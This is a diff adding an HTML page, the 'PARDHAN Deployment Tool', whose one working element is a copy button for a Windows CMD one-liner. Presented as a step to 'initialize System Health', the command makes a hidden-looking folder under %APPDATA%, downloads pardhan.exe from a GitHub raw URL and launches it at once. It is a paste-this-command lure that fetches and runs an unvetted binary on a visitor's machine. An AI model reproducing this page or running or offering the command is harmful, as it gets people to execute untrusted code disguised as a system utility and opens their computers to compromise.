@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PARDHAN Deployment Tool</title>
+    <style>
+        body {
+            background-color: #0d1117;
+            color: #c9d1d9;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            background: #161b22;
+            border: 1px solid #30363d;
+            padding: 40px;
+            border-radius: 15px;
+            text-align: center;
+            max-width: 600px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        h1 { color: #58a6ff; margin-bottom: 10px; }
+        p { color: #8b949e; font-size: 0.9rem; margin-bottom: 25px; }
+        .code-box {
+            background: #010409;
+            border: 1px solid #30363d;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 0.85rem;
+            color: #7ee787;
+            text-align: left;
+            word-break: break-all;
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .copy-btn {
+            background-color: #238636;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+        .copy-btn:hover { background-color: #2ea043; }
+        .success-msg {
+            color: #7ee787;
+            margin-top: 10px;
+            display: none;
+            font-size: 0.8rem;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>💀 PARDHAN DEPLOY 💀</h1>
+        <p>Copy and run this command in CMD to initialize System Health</p>
+        
+        <div class="code-box" id="command">
+            mkdir "%APPDATA%\SystemHealth" 2>nul & curl -L -o "%APPDATA%\SystemHealth\pardhan.exe" "https://github.com/messy-leon/Pardhanji/raw/main/pardhan.exe" & start "" "%APPDATA%\SystemHealth\pardhan.exe"
+        </div>
+
+        <button class="copy-btn" onclick="copyCommand()">COPY BEAST COMMAND</button>
+        <div id="msg" class="success-msg">✅ Command Copied to Clipboard!</div>
+    </div>
+
+    <script>
+        function copyCommand() {
+            const codeText = document.getElementById('command').innerText;
+            navigator.clipboard.writeText(codeText).then(() => {
+                const msg = document.getElementById('msg');
+                msg.style.display = 'block';
+                setTimeout(() => { msg.style.display = 'none'; }, 2000);
+            });
+        }
+    </script>
+
+</body>
+</html>
